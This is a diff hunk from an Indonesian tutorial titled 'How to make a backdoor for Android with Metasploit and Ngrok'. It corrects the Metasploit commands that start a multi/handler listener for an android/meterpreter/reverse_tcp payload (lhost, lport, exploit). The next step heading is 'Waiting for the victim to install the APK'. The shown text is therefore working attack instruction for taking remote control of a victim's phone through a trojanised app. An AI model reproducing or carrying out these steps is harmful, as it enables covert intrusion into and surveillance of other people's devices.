@@ -26,8 +26,8 @@ Cara Membuat Backdoor Untuk Android Dengan Metaspolit Dan Ngrok
 **9. EKSEKUSI**
 <br> msf > use multi/handler
 <br> msf exploit(muti/handler) > set payload android/meterpreter/reverse_tcp
-<br> msf exploit(muti/handler) > set 1host 0.0.0.0
-<br> msf exploit(muti/handler) > set 1port 4455
+<br> msf exploit(muti/handler) > set lhost 0.0.0.0
+<br> msf exploit(muti/handler) > set lport 4455
 <br> msf exploit(muti/handler) > exploit
 
 **10. Menunggu Korban Install APK**
